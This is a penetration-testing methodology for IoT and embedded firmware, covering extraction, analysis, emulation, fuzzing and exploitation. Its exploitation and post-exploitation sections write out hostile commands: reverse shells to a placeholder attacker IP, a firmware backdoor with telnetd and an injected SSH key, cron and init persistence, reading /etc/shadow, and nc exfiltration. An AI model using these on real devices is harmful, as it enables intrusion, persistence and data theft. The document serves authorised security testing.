# Hardware & Embedded Systems Security Testing Methodology

**Version:** 1.0
**Last Updated:** 2026-01-29
**Framework:** OWASP Firmware Security Testing Methodology (FSTM) + OWASP IoT Security Testing Guide (ISTG)

---

## Overview

This methodology provides a comprehensive approach to security testing of hardware devices, embedded systems, IoT devices, and firmware. It combines the OWASP FSTM's 9-stage firmware analysis framework with hardware interface testing and runtime exploitation techniques.

**Target Systems:**
- IoT devices (smart home, industrial sensors, medical devices)
- Embedded systems (automotive ECUs, industrial controllers)
- Network appliances (routers, switches, firewalls)
- Consumer electronics (cameras, NAS, smart TVs)
- Industrial control systems (SCADA, PLCs)

**Reference Standards:**
- OWASP Firmware Security Testing Methodology (FSTM)
- OWASP IoT Security Testing Guide (ISTG)
- OWASP IoT Security Verification Standard (ISVS)
- NIST SP 800-213: IoT Device Cybersecurity Guidance
- ETSI EN 303 645: Cybersecurity for Consumer IoT

---

## Phase 1: Information Gathering & Reconnaissance

### 1.1 Device Intelligence

**Objectives:**
- Identify device specifications, architecture, and components
- Collect manufacturer documentation and technical details
- Map potential attack surfaces

**Activities:**

1. **Physical Inspection**
   ```bash
   # Document device components
   - Take high-resolution photos of PCB (front and back)
   - Identify chips: CPU, memory, flash storage, wireless modules
   - Locate debug interfaces: UART, JTAG, SWD headers
   - Note FCC ID, model numbers, revision markings
   ```

2. **Datasheet Collection**
   - Identify CPU architecture (ARM, MIPS, x86, RISC-V)
   - Obtain datasheets for main processor and components
   - Review manufacturer documentation and user manuals
   - Search for SDK, developer guides, source code repos

3. **OSINT Reconnaissance**
   ```bash
   # Search for existing research
   - Google: "[device model] teardown"
   - Google: "[device model] vulnerability"
   - Search exploit-db.com, GitHub security advisories
   - Check CVE databases for known vulnerabilities
   - Review FCC filings: fccid.io
   ```

4. **Network Reconnaissance**
   ```bash
   # Network service discovery
   nmap -sV -p- <device_ip>
   nmap --script vuln <device_ip>

   # Identify wireless protocols
   - WiFi (2.4GHz/5GHz)
   - Bluetooth/BLE
   - Zigbee, Z-Wave, LoRaWAN
   - Proprietary RF protocols
   ```

**Tools:** Camera, multimeter, FCC database, Google, Shodan, Censys, nmap

**Output:** Device intelligence report, architecture diagram, attack surface map

---

## Phase 2: Firmware Acquisition

### 2.1 Firmware Extraction Methods

**Objectives:**
- Obtain firmware image for analysis
- Preserve multiple firmware versions (debug, release, updates)

**Extraction Techniques (Ordered by Difficulty):**

1. **Direct Download**
   ```bash
   # Manufacturer sources
   - Official support websites
   - Update check endpoints (MitM interception)
   - Cloud storage buckets (AWS S3, Azure Blob)

   # Google dorks for firmware
   intitle:"index of" inurl:firmware <device_model>
   site:s3.amazonaws.com firmware <manufacturer>
   ```

2. **Network-Based Extraction**
   ```bash
   # MitM during update
   # Configure transparent proxy with reaper
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

   # Capture update traffic
   tcpdump -i eth0 -w firmware_update.pcap

   # Extract from captured traffic
   binwalk firmware_update.pcap
   ```

3. **UART-Based Extraction**
   ```bash
   # Connect to UART interface (identify TX, RX, GND)
   screen /dev/ttyUSB0 115200

   # Common bootloader commands
   printenv                    # Show environment variables
   help                        # List available commands
   md <address> <length>       # Memory dump

   # Extract via TFTP from bootloader
   setenv serverip 192.168.1.100
   tftp 0x80000000 dump.bin
   saveenv
   ```

4. **JTAG/SWD Extraction**
   ```bash
   # Identify JTAG pinout with JTAGulator
   python jtagenum.py

   # Connect with OpenOCD
   openocd -f interface/ftdi/jtagkey.cfg -f target/arm926ejs.cfg

   # Dump flash memory
   dump_image firmware.bin 0x0 0x800000
   ```

5. **Hardware Flash Chip Extraction**
   ```bash
   # Identify flash chip (read marking)
   # Common: Winbond W25Q64, Macronix MX25L, Spansion S25FL

   # Read with programmer
   flashrom -p ch341a_spi -r firmware.bin

   # Or use clip adapter (non-destructive)
   flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin
   ```

**Tools:** Wireshark, tcpdump, screen, minicom, OpenOCD, JTAGulator, flashrom, CH341A programmer, Bus Pirate

**Output:** Firmware image files (multiple versions if available), extraction notes

---

## Phase 3: Firmware Analysis

### 3.1 Initial Triage

**Objectives:**
- Identify firmware file type, architecture, and structure
- Detect compression, encryption, or obfuscation

**Analysis Commands:**

```bash
# Basic file identification
file firmware.bin
strings firmware.bin | less
hexdump -C firmware.bin | head -100

# Firmware analysis with binwalk
binwalk firmware.bin
binwalk -E firmware.bin              # Entropy analysis (detect encryption)
binwalk -A firmware.bin              # Opcode analysis (identify architecture)
binwalk --signature firmware.bin    # Detailed signature scan

# Alternative: unblob (modern replacement)
unblob firmware.bin

# Check for specific signatures
binwalk -R "\x1f\x8b\x08" firmware.bin   # gzip
binwalk -R "hsqs" firmware.bin           # SquashFS
binwalk -R "UBI#" firmware.bin           # UBIFS
```

**Entropy Analysis:**
- **Low entropy (0.0-0.6):** Uncompressed or sparse data
- **Medium entropy (0.6-0.9):** Compressed data
- **High entropy (0.95-1.0):** Encrypted or random data

**Architecture Detection:**
```bash
# Identify CPU architecture
binwalk -A firmware.bin
readelf -h extracted_binary
file extracted_binary
```

**Tools:** binwalk, unblob, file, strings, hexdump, Binvis.io

**Output:** Firmware composition report, architecture identification, entropy analysis

---

## Phase 4: Filesystem Extraction

### 4.1 Automated Extraction

**Objectives:**
- Extract filesystem from firmware image
- Preserve file permissions and metadata

**Extraction Methods:**

```bash
# Automated extraction with binwalk
binwalk -ev firmware.bin

# Alternative: unblob (handles nested filesystems better)
unblob --extract-dir ./extracted firmware.bin

# Manual extraction (if automated fails)
# 1. Identify filesystem offset from binwalk output
binwalk firmware.bin | grep -i squashfs
# Example: 2621440    0x280000    Squashfs filesystem

# 2. Extract with dd
dd if=firmware.bin of=rootfs.squashfs bs=1 skip=2621440

# 3. Extract filesystem
unsquashfs rootfs.squashfs
```

### 4.2 Filesystem-Specific Extraction

**SquashFS:**
```bash
unsquashfs -d ./squashfs-root rootfs.squashfs
```

**JFFS2:**
```bash
jefferson rootfs.jffs2 -d ./jffs2-root
```

**UBIFS:**
```bash
ubireader_extract_images -o ./ubi firmware.bin
ubireader_extract_files -o ./ubifs ./ubi/*.ubi
```

**CPIO:**
```bash
cpio -ivd --no-absolute-filenames < rootfs.cpio
```

**CramFS:**
```bash
cramfsck -x ./cramfs-root rootfs.cramfs
```

**Tools:** binwalk, unblob, unsquashfs, jefferson, ubireader, cpio, cramfsck

**Output:** Extracted filesystem directory, file inventory

---

## Phase 5: Static Analysis

### 5.1 Configuration & Credential Analysis

**Objectives:**
- Identify hardcoded credentials, API keys, certificates
- Discover dangerous configurations and legacy services
- Map attack surface from filesystem contents

**Automated Scanning:**

```bash
# Firmwalker - comprehensive static analysis
./firmwalker.sh ./extracted-filesystem/

# FACT (Firmware Analysis and Comparison Tool)
# Upload firmware to FACT web interface
# Analyzes: CVEs, certificates, crypto keys, software components

# EMBA - Embedded Analyzer
./emba.sh -l ./logs -f ./firmware.bin -m <profile>
# Profiles: default, full, kernel, web

# Manual searches
grep -r "password" ./extracted-filesystem/
grep -r "api_key" ./extracted-filesystem/
grep -r "secret" ./extracted-filesystem/
find . -name "*.pem" -o -name "*.key" -o -name "*.crt"
```

### 5.2 Binary Security Analysis

**Objectives:**
- Assess binary hardening features
- Identify vulnerable functions and code patterns

**Security Feature Detection:**

```bash
# Check all binaries for security features
for file in $(find ./bin ./sbin ./usr/bin -type f); do
    echo "=== $file ==="
    checksec --file=$file
done

# Detailed binary analysis
readelf -a ./usr/bin/httpd | grep -E "(STACK|RELRO|stack_chk)"

# Common checks:
# - Stack Canary: grep stack_chk_fail
# - PIE/PIC: readelf -h <bin> | grep Type
# - NX/DEP: readelf -lW <bin> | grep STACK
# - RELRO: readelf -d <bin> | grep BIND_NOW
# - Fortify: readelf -s <bin> | grep _chk
```

**Dangerous Function Detection:**

```bash
# Flawfinder - find dangerous C functions
flawfinder --minlevel=2 ./extracted-filesystem/

# Common vulnerable functions:
# - strcpy, strcat, sprintf, gets (buffer overflows)
# - system, popen, exec* (command injection)
# - scanf, sscanf (format string)

# Search binaries for dangerous imports
for binary in ./bin/* ./sbin/*; do
    echo "=== $binary ==="
    rabin2 -i $binary | grep -E "(strcpy|system|popen)"
done
```

### 5.3 Web Interface Analysis

**Objectives:**
- Analyze web server configurations and CGI scripts
- Identify authentication mechanisms and API endpoints

**Web Component Analysis:**

```bash
# Identify web servers
find . -name "lighttpd.conf" -o -name "httpd.conf" -o -name "nginx.conf"

# Find CGI scripts
find . -name "*.cgi"

# Analyze with Ghidra/radare2
r2 -AA ./usr/sbin/httpd
afl                          # List functions
pdf @ main                   # Disassemble main
iz                           # List strings
```

**Tools:** firmwalker, FACT, EMBA, checksec, flawfinder, cppcheck, Ghidra, radare2, Semgrep

**Output:** Vulnerability report, hardcoded credentials list, binary security assessment

---

## Phase 6: Emulation & Dynamic Setup

### 6.1 User-Mode Emulation

**Objectives:**
- Execute individual binaries for testing
- Analyze program behavior in isolated environment

**QEMU User-Mode Emulation:**

```bash
# Identify architecture and endianness
readelf -h ./usr/bin/httpd
# Example: ARM, 32-bit, little-endian

# Copy QEMU static binary to filesystem
cp /usr/bin/qemu-arm-static ./extracted-filesystem/usr/bin/

# Chroot and execute
sudo chroot ./extracted-filesystem /usr/bin/qemu-arm-static /usr/sbin/httpd

# Emulate with debugging
sudo chroot ./extracted-filesystem /usr/bin/qemu-arm-static -g 1234 /usr/sbin/httpd
```

### 6.2 Full-System Emulation

**Objectives:**
- Boot complete firmware in virtual environment
- Enable network-based testing and exploitation

**Firmadyne Setup:**

```bash
# Automated emulation with FAT (Firmware Analysis Toolkit)
./fat.py firmware.bin

# Manual Firmadyne
python3 sources/extractor/extractor.py -b <brand> -sql <db> -np firmware.bin
./scripts/getArch.sh ./images/1.tar.gz
./scripts/tar2db.py -i 1 -f ./images/1.tar.gz
./scripts/makeImage.sh 1
./scripts/inferNetwork.sh 1
./scripts/run.sh 1
```

**Alternative Emulation Frameworks:**

```bash
# ARM-X - IoT firmware emulator
python3 armx.py -f firmware.bin

# Qiling - multi-architecture emulator
python3 qiling_emu.py --rootfs ./extracted-filesystem --firmware firmware.bin
```

**Tools:** QEMU, Firmadyne, FAT, ARM-X, Qiling

**Output:** Emulated firmware instance, network accessibility, running services

---

## Phase 7: Dynamic Analysis & Vulnerability Discovery

### 7.1 Network Service Testing

**Objectives:**
- Test exposed network services for vulnerabilities
- Exploit authentication bypass, command injection, buffer overflows

**Web Application Testing:**

```bash
# Service discovery
nmap -sV -p- <emulated_device_ip>

# Web vulnerability scanning
nikto -h http://<device_ip>
nuclei -u http://<device_ip> -t cves/ -t vulnerabilities/

# Manual testing with proxy
# Configure reaper or mitmproxy
# Test for:
# - Default credentials (admin:admin, root:root)
# - Directory traversal (../../etc/passwd)
# - Command injection (;ls, |whoami, `id`)
# - SQL injection (', 1' OR '1'='1)
# - CSRF, XSS, insecure direct object references
```

**API Testing:**

```bash
# Enumerate API endpoints
ffuf -w wordlist.txt -u http://<device_ip>/api/FUZZ

# Test REST API
curl -X GET http://<device_ip>/api/users
curl -X POST http://<device_ip>/api/upload -F "file=@shell.php"

# Test for authentication bypass
# Missing authorization checks
# Insecure token generation
```

### 7.2 Fuzzing

**Objectives:**
- Discover crashes and memory corruption vulnerabilities
- Test input validation in network services and parsers

**Network Service Fuzzing:**

```bash
# AFL++ instrumentation
afl-cc -o httpd_instrumented httpd.c
afl-fuzz -i input_corpus -o findings ./httpd_instrumented @@

# Boofuzz network protocol fuzzing
python3 boofuzz_http.py

# radamsa for file format fuzzing
radamsa -n 1000 -o fuzzed_%n.bin sample.bin
```

**Firmware Component Fuzzing:**

```bash
# Honggfuzz with hardware feedback
honggfuzz -i corpus/ -o output/ -- ./target_binary @@

# Binary-only fuzzing with QEMU
AFL_QEMU_PERSISTENT_ADDR=0x<addr> afl-fuzz -Q -i in -o out -- ./target
```

### 7.3 Bootloader Testing

**Objectives:**
- Test bootloader security controls
- Attempt boot parameter modification and unsigned firmware loading

**U-Boot Testing:**

```bash
# Access U-Boot console (interrupt boot sequence)
# Common keys: ESC, SPACE, Ctrl+C

# U-Boot commands to test
printenv                      # Show environment variables
setenv bootargs "init=/bin/sh"  # Modify boot args for root shell
saveenv                       # Persist changes
boot                          # Boot with modified args

# Load firmware via TFTP
setenv ipaddr 192.168.1.50
setenv serverip 192.168.1.100
tftp 0x80000000 malicious_firmware.bin
bootm 0x80000000

# Check for signature verification
# Can we load unsigned firmware?
```

**Tools:** reaper, mitmproxy, nuclei, nikto, ffuf, AFL++, boofuzz, Honggfuzz, nmap, Metasploit

**Output:** Vulnerability findings, crash logs, proof-of-concept exploits

---

## Phase 8: Runtime Analysis & Reverse Engineering

### 8.1 Dynamic Debugging

**Objectives:**
- Trace program execution and system calls
- Identify exploitable memory corruption vulnerabilities

**GDB Remote Debugging:**

```bash
# Start binary with gdb server (on device or emulated)
gdbserver :1234 ./httpd

# Connect from host with gdb-multiarch
gdb-multiarch ./httpd
target remote <device_ip>:1234

# Set breakpoints on vulnerable functions
break strcpy
break memcpy
break system

# Send malicious payload and analyze crash
run
```

**System Call Tracing:**

```bash
# Trace system calls
strace -f ./httpd

# Trace library calls
ltrace ./httpd

# Identify:
# - File access patterns
# - Network connections
# - Child process spawning
# - Security-sensitive operations
```

### 8.2 Binary Reverse Engineering

**Objectives:**
- Understand proprietary protocols and crypto implementations
- Identify logic flaws and backdoor code

**Ghidra Analysis:**

```bash
# Import binary to Ghidra
# Auto-analyze with default options
# Focus areas:
# - main() function flow
# - Authentication handlers
# - Crypto key generation
# - Update verification routines
# - Command parsing functions
```

**Radare2 Analysis:**

```bash
r2 -AA ./proprietary_daemon
afl                          # List all functions
pdf @ sym.check_password     # Decompile password check
iz                           # List strings
/c strcpy                    # Search for function calls
```

**Frida Instrumentation:**

```bash
# Hook function at runtime
frida -U -l hook.js <process_name>

# Example hook script
Interceptor.attach(Module.findExportByName(null, "strcmp"), {
    onEnter: function(args) {
        console.log("strcmp called:");
        console.log("  arg1:", Memory.readUtf8String(args[0]));
        console.log("  arg2:", Memory.readUtf8String(args[1]));
    }
});
```

**Tools:** GDB-multiarch, gdbserver, pwndbg, GEF, PEDA, strace, ltrace, Ghidra, radare2, Cutter, Frida, Angr

**Output:** Reverse engineering notes, protocol documentation, vulnerability analysis

---

## Phase 9: Exploitation & Impact Demonstration

### 9.1 Exploit Development

**Objectives:**
- Develop working exploits for identified vulnerabilities
- Demonstrate real-world security impact

**Buffer Overflow Exploitation:**

```bash
# Generate shellcode for target architecture
msfvenom -p linux/armle/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f python

# Develop exploit with pwntools
python3 exploit.py

# ROP chain development (if NX enabled)
ROPgadget --binary ./httpd --ropchain

# Test exploit
nc -lvp 4444                 # Listen for reverse shell
python3 exploit.py           # Trigger exploit
```

**Command Injection:**

```bash
# Identify injection point in web interface or API
# Test payload: ;id
# Full exploit: ;busybox nc <attacker_ip> 4444 -e /bin/sh

# Metasploit payload generation
msfvenom -p cmd/unix/reverse_netcat LHOST=<ip> LPORT=4444 -f raw
```

### 9.2 Firmware Modification

**Objectives:**
- Create malicious firmware with backdoors
- Test firmware signature verification bypass

**Firmware Backdooring:**

```bash
# Extract filesystem (from Phase 4)
# Modify startup script
echo "telnetd -l /bin/sh &" >> ./etc/init.d/rcS

# Add SSH authorized key
mkdir -p ./root/.ssh
echo "<attacker_pubkey>" > ./root/.ssh/authorized_keys

# Rebuild firmware
# For SquashFS
mksquashfs ./squashfs-root modified_rootfs.squashfs -comp xz

# Combine with bootloader/kernel
dd if=firmware.bin of=modified_firmware.bin bs=1 count=<rootfs_offset>
cat modified_rootfs.squashfs >> modified_firmware.bin
```

**Firmware Upload Testing:**

```bash
# Test if device accepts modified firmware
curl -X POST -F "firmware=@modified_firmware.bin" \
     http://<device_ip>/cgi-bin/upgrade.cgi

# Check for:
# - Signature verification bypass
# - Version downgrade attacks
# - Unsigned firmware acceptance
```

### 9.3 Persistence & Post-Exploitation

**Objectives:**
- Establish persistent access
- Exfiltrate sensitive data

**Persistence Mechanisms:**

```bash
# Add cron job
echo "*/5 * * * * /tmp/.backdoor" > ./etc/crontabs/root

# Modify init scripts
echo "/tmp/.backdoor &" >> ./etc/rc.local

# Replace legitimate binary
cp /tmp/backdoor ./usr/sbin/legitimate_service
```

**Data Exfiltration:**

```bash
# Extract configuration
cat /etc/config/* > /tmp/config_dump.txt

# Extract credentials
cat /etc/passwd
cat /etc/shadow

# Network exfiltration
nc <attacker_ip> 5555 < /tmp/sensitive_data.tar.gz
```

**Tools:** msfvenom, Metasploit, pwntools, ROPgadget, Buildroot, mksquashfs, binwalk

**Output:** Working exploits, proof-of-concept demonstrations, impact assessment

---

## Hardware Interface Testing

### UART Testing

**Objectives:**
- Access serial console for debugging and command execution
- Extract firmware or gain root shell access

**UART Identification:**

```bash
# Identify UART pins on PCB
# Look for: 3-4 pin headers near CPU
# Common pinout: VCC, GND, TX, RX

# Use multimeter to identify pins
# VCC: 3.3V or 5V constant
# GND: 0V (common ground)
# TX: Voltage fluctuations during boot
# RX: Input pin

# Connect USB-to-TTL adapter
# WARNING: Match voltage levels (3.3V or 5V)
# Connect: GND-GND, Device_TX-Adapter_RX, Device_RX-Adapter_TX
```

**Serial Console Access:**

```bash
# Common baud rates: 115200, 57600, 38400, 9600
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200

# Test credentials
root / (blank)
admin / admin
root / root
```

**Tools:** USB-to-TTL adapter (FT232, CP2102), multimeter, logic analyzer, screen, minicom, PuTTY

### JTAG/SWD Testing

**Objectives:**
- Access hardware debugging interface
- Dump firmware and memory contents

**JTAG Identification:**

```bash
# Standard JTAG pinout: TCK, TMS, TDI, TDO, TRST, GND, VCC
# Automated pin identification
python jtagenum.py -p /dev/ttyUSB0

# Or use JTAGulator hardware
```

**JTAG Operations:**

```bash
# Connect with OpenOCD
openocd -f interface/ftdi/jtagkey.cfg -f target/arm926ejs.cfg

# Halt CPU
halt

# Dump memory
dump_image flash_dump.bin 0x0 0x800000

# Single-step debugging
step

# Resume execution
resume
```

**Tools:** JTAG debugger (J-Link, Bus Pirate, FT2232H), JTAGulator, OpenOCD, UrJTAG

### Side-Channel Analysis

**Objectives:**
- Extract cryptographic keys via power/EM analysis
- Perform fault injection attacks

**Power Analysis:**

```bash
# Capture power traces during crypto operations
# Use ChipWhisperer or oscilloscope

# Differential Power Analysis (DPA)
# Simple Power Analysis (SPA)
# Correlation Power Analysis (CPA)
```

**Fault Injection:**

```bash
# Glitch attack targets:
# - Boot signature verification
# - Authentication checks
# - Crypto operations

# Voltage glitching
# Clock glitching
# EM fault injection
```

**Tools:** ChipWhisperer, oscilloscope, signal generator, ChipSHOUTER

---

## Reporting & Remediation

### Vulnerability Severity

**CVSS v3.1 Scoring for Hardware/IoT:**

| Severity | Score | Example |
|----------|-------|---------|
| Critical | 9.0-10.0 | Unauthenticated RCE with network access |
| High | 7.0-8.9 | Authentication bypass, command injection |
| Medium | 4.0-6.9 | XSS, CSRF, information disclosure |
| Low | 0.1-3.9 | Weak crypto, missing security headers |

### Report Structure

1. **Executive Summary**
   - Device information
   - Overall security posture
   - Critical findings summary

2. **Methodology**
   - Testing phases executed
   - Tools and techniques used

3. **Findings**
   - Vulnerability title
   - CVSS score and severity
   - Affected component
   - Description and impact
   - Proof-of-concept / reproduction steps
   - Remediation recommendations

4. **Appendices**
   - Detailed technical analysis
   - Exploit code
   - Network diagrams
   - Reference materials

### Common Vulnerabilities

1. **Hardcoded Credentials** (CWE-798)
2. **Command Injection** (CWE-77, CWE-78)
3. **Buffer Overflow** (CWE-120, CWE-121)
4. **Missing Authentication** (CWE-306)
5. **Insecure Firmware Updates** (CWE-494)
6. **Use of Hardcoded Cryptographic Keys** (CWE-321)
7. **Cleartext Transmission of Sensitive Information** (CWE-319)
8. **SQL Injection** (CWE-89)
9. **Path Traversal** (CWE-22)
10. **Improper Access Control** (CWE-284)

---

## Tools Summary

### Firmware Extraction
- **flashrom** - Flash chip programmer
- **OpenOCD** - JTAG/SWD interface
- **Bus Pirate** - Multi-protocol hardware hacking tool
- **CH341A** - USB SPI/I2C programmer

### Firmware Analysis
- **binwalk** - Firmware analysis and extraction
- **unblob** - Universal firmware extractor
- **FACT** - Firmware Analysis and Comparison Tool
- **EMBA** - Embedded Analyzer (full security audit)
- **firmwalker** - Static analysis script

### Binary Analysis
- **Ghidra** - NSA reverse engineering suite
- **radare2/rizin** - UNIX reverse engineering framework
- **Cutter** - GUI for rizin
- **IDA Free** - Interactive disassembler
- **checksec** - Binary hardening checker
- **ROPgadget** - ROP chain generator

### Emulation
- **QEMU** - Multi-architecture emulator
- **Firmadyne** - Automated firmware emulation
- **FAT** - Firmware Analysis Toolkit
- **ARM-X** - IoT firmware emulator
- **Qiling** - Advanced binary emulation framework

### Static Analysis
- **Flawfinder** - C/C++ dangerous function scanner
- **Cppcheck** - C/C++ static analyzer
- **Semgrep** - Pattern-based code scanner
- **CodeQL** - Semantic code analysis
- **Clang-Tidy** - LLVM C++ linter

### Dynamic Testing
- **GDB** - GNU Debugger (with pwndbg/GEF/PEDA)
- **Frida** - Dynamic instrumentation toolkit
- **strace/ltrace** - System/library call tracing
- **AFL++** - Coverage-guided fuzzer
- **Honggfuzz** - Hardware-assisted fuzzer
- **boofuzz** - Network protocol fuzzer

### Network Testing
- **nmap** - Network scanner
- **mitmproxy** - HTTP/HTTPS proxy for traffic inspection
- **reaper** - API security proxy
- **nuclei** - Vulnerability scanner
- **Metasploit** - Exploitation framework

### Hardware Interfaces
- **screen/minicom** - Serial terminal
- **OpenOCD** - JTAG debugger
- **JTAGulator** - JTAG pin finder
- **sigrok/PulseView** - Logic analyzer software
- **ChipWhisperer** - Side-channel analysis platform

---

## References

**Standards & Guidelines:**
- [OWASP Firmware Security Testing Methodology](https://github.com/scriptingxss/owasp-fstm)
- [OWASP IoT Security Testing Guide](https://owasp.org/www-project-iot-security-testing-guide/)
- [NIST SP 800-213: IoT Device Cybersecurity Guidance](https://csrc.nist.gov/publications/detail/sp/800-213/final)
- [ETSI EN 303 645: Cybersecurity for Consumer IoT](https://www.etsi.org/deliver/etsi_en/303600_303699/303645/02.01.01_60/en_303645v020101p.pdf)

**Training & Resources:**
- [SANS SEC556: IoT Penetration Testing](https://www.sans.org/cyber-security-courses/iot-penetration-testing/)
- [Embedded Security CTF](https://microcorruption.com/)
- [Hardware Hacking Handbook](https://nostarch.com/hardwarehacking)
- [The IoT Hacker's Handbook](https://www.apress.com/gp/book/9781484242995)

**Tool Documentation:**
- [Binwalk Documentation](https://github.com/ReFirmLabs/binwalk)
- [Ghidra Documentation](https://ghidra-sre.org/)
- [QEMU Documentation](https://www.qemu.org/docs/master/)
- [Firmadyne GitHub](https://github.com/firmadyne/firmadyne)

---

**Document Version:** 1.0
**Framework:** ▲ Intelligence Adjacent (IA) Security Skill
**Compliance:** OWASP FSTM, OWASP ISTG, NIST SP 800-213, ETSI EN 303 645
